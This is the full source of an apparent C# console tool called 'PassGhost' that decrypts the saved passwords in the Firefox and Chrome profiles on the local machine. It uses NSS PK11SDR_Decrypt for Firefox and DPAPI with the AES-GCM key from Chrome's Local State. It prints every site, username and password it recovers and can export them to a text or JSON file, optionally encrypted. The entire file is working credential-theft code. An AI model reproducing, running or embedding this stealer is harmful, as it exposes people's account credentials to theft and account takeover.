using System.Text.Json;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Data.SQLite;
using System.Text.Json.Nodes;

class Program
{
    [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int NSS_Init(string configdir);

    [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int NSS_Shutdown();

    [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int PK11_GetInternalKeySlot();

    [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int PK11_Authenticate(IntPtr slot, bool loadCerts, IntPtr wincx);

    [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, IntPtr cx);

    [StructLayout(LayoutKind.Sequential)]
    public struct TSECItem
    {
        public int type;
        public IntPtr data;
        public int len;
    }

    static byte[] Base64ToBytes(string base64) => Convert.FromBase64String(base64);

    static string DecryptFirefox(string base64)
    {
        byte[] encrypted = Base64ToBytes(base64);
        TSECItem input = new() { data = Marshal.AllocHGlobal(encrypted.Length), len = encrypted.Length, type = 0 };
        Marshal.Copy(encrypted, 0, input.data, encrypted.Length);
        TSECItem output = new();
        string result = "";

        if (PK11SDR_Decrypt(ref input, ref output, IntPtr.Zero) == 0 && output.len > 0)
        {
            byte[] decoded = new byte[output.len];
            Marshal.Copy(output.data, decoded, 0, output.len);
            result = Encoding.UTF8.GetString(decoded);
        }

        Marshal.FreeHGlobal(input.data);
        return result;
    }

    static string DecryptChrome(byte[] encryptedData)
    {
        try
        {
            if (encryptedData == null || encryptedData.Length == 0)
                return null;

            if (Encoding.UTF8.GetString(encryptedData.Take(3).ToArray()) != "v10")
            {
                byte[] decrypted = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                return Encoding.UTF8.GetString(decrypted);
            }

            string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google", "Chrome", "User Data", "Local State");

            if (!File.Exists(localStatePath))
                return null;

            string json = File.ReadAllText(localStatePath);
            var localState = JsonNode.Parse(json);
            string encryptedKeyB64 = localState["os_crypt"]["encrypted_key"].ToString();

            byte[] encryptedKey = Convert.FromBase64String(encryptedKeyB64);
            encryptedKey = encryptedKey.Skip(5).ToArray();
            byte[] masterKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);

            byte[] nonce = encryptedData.Skip(3).Take(12).ToArray();
            byte[] ciphertextTag = encryptedData.Skip(15).ToArray();

            using var aesGcm = new AesGcm(masterKey);
            byte[] plaintext = new byte[ciphertextTag.Length - 16];
            aesGcm.Decrypt(nonce, ciphertextTag, ciphertextTag[^16..], plaintext);
            return Encoding.UTF8.GetString(plaintext);
        }
        catch
        {
            return null;
        }
    }

    static List<string> FindFirefoxProfiles()
    {
        string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles");
        return Directory.Exists(path)
            ? Directory.GetDirectories(path).Where(d => File.Exists(Path.Combine(d, "logins.json"))).ToList()
            : new();
    }

    static string FindChromeProfile()
    {
        string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Default");
        return File.Exists(Path.Combine(path, "Login Data")) ? path : null;
    }

    static async Task<List<(string, string, string)>> LoadFirefoxPasswordsAsync(string profilePath)
    {
        var results = new List<(string, string, string)>();
        int initResult = NSS_Init(profilePath);
        //Console.WriteLine($"[DEBUG] NSS_Init returned: {initResult}");

        if (initResult != 0) return results;

        string loginsJson = Path.Combine(profilePath, "logins.json");
        if (!File.Exists(loginsJson)) return results;

        string jsonContent = await File.ReadAllTextAsync(loginsJson);
        using JsonDocument doc = JsonDocument.Parse(jsonContent);
        foreach (var login in doc.RootElement.GetProperty("logins").EnumerateArray())
        {
            string host = login.GetProperty("hostname").GetString();
            string user = DecryptFirefox(login.GetProperty("encryptedUsername").GetString());
            string pass = DecryptFirefox(login.GetProperty("encryptedPassword").GetString());
            results.Add((host, user, pass));
        }

        NSS_Shutdown();
        return results;
    }

    static List<(string, string, string)> LoadChromePasswords(string profilePath)
    {
        var results = new List<(string, string, string)>();
        string dbPath = Path.Combine(profilePath, "Login Data");
        string temp = Path.GetTempFileName();
        File.Copy(dbPath, temp, true);

        using var conn = new SQLiteConnection($"Data Source={temp};Version=3;Read Only=True;");
        conn.Open();
        string query = "SELECT origin_url, username_value, password_value FROM logins";
        using var cmd = new SQLiteCommand(query, conn);
        using var reader = cmd.ExecuteReader();
        while (reader.Read())
        {
            string url = reader.GetString(0);
            string user = reader.GetString(1);
            string pass = DecryptChrome((byte[])reader["password_value"]);
            results.Add((url, user, pass));
        }

        try { File.Delete(temp); } catch { }
        return results;
    }

    static void PrintBanner()
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine(@"
 ____                ____ _               _   
|  _ \ __ _ ___ ___ / ___| |__   ___  ___| |_ 
| |_) / _` / __/ __| |  _| '_ \ / _ \/ __| __|
|  __/ (_| \__ \__ \ |_| | | | | (_) \__ \ |_ 
|_|   \__,_|___/___/\____|_| |_|\___/|___/\__|
     Firefox & Chrome Password Decryptor
");
        Console.ResetColor();
    }

    static async Task<int> Main(string[] args)
    {
        PrintBanner();

        bool exportTxt = false, exportJson = false, encryptOutput = false;
        string exportFile = "output";
        string encryptionPassword = "secret_key";

        for (int i = 0; i < args.Length; i++)
        {
            if (args[i] is "--help" or "-h")
            {
                Console.WriteLine("Usage:");
                Console.WriteLine("  --export-txt <filename>   Export to text file");
                Console.WriteLine("  --export-json <filename>  Export to JSON file");
                Console.WriteLine("  --encrypt                 Encrypt exported file");
                Console.WriteLine("  --password <key>          Password for encryption");
                return 0;
            }
            else if (args[i] == "--export-txt" && i + 1 < args.Length)
            {
                exportTxt = true;
                exportFile = args[++i];
            }
            else if (args[i] == "--export-json" && i + 1 < args.Length)
            {
                exportJson = true;
                exportFile = args[++i];
            }
            else if (args[i] == "--encrypt")
            {
                encryptOutput = true;
            }
            else if (args[i] == "--password" && i + 1 < args.Length)
            {
                encryptionPassword = args[++i];
            }
        }

        var all = new List<(string, string, string)>();

        foreach (var profile in FindFirefoxProfiles())
        {
            Console.WriteLine($"[Firefox] Loading: {profile}");
            var pwds = await LoadFirefoxPasswordsAsync(profile);
            all.AddRange(pwds);
        }

        string chrome = FindChromeProfile();
        if (chrome != null)
        {
            Console.WriteLine($"[Chrome] Loading: {chrome}");
            all.AddRange(LoadChromePasswords(chrome));
        }

        if (all.Count == 0)
        {
            Console.WriteLine("No passwords found.");
            return 1;
        }

        foreach (var (host, user, pass) in all)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("🔐 URL: "); Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(host);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("👤 Username: "); Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(user);
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("🔑 Password: "); Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(pass);
            Console.WriteLine();
        }
        Console.ResetColor();

        if (exportTxt)
        {
            string text = string.Join("\n\n", all.Select(e => $"URL: {e.Item1}\nUsername: {e.Item2}\nPassword: {e.Item3}"));
            if (encryptOutput) text = EncryptString(text, encryptionPassword);
            await File.WriteAllTextAsync(exportFile + ".txt", text);
        }

        if (exportJson)
        {
            string json = JsonSerializer.Serialize(all.Select(e => new { url = e.Item1, username = e.Item2, password = e.Item3 }), new JsonSerializerOptions { WriteIndented = true });
            if (encryptOutput) json = EncryptString(json, encryptionPassword);
            await File.WriteAllTextAsync(exportFile + ".json", json);
        }

        return 0;
    }

    static string EncryptString(string input, string password)
    {
        byte[] salt = Encoding.UTF8.GetBytes("s@1t!");
        var key = new Rfc2898DeriveBytes(password, salt, 10000);
        using var aes = Aes.Create();
        aes.Key = key.GetBytes(32);
        aes.IV = key.GetBytes(16);

        using var ms = new MemoryStream();
        using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
        using (var sw = new StreamWriter(cs)) sw.Write(input);
        return Convert.ToBase64String(ms.ToArray());
    }
}
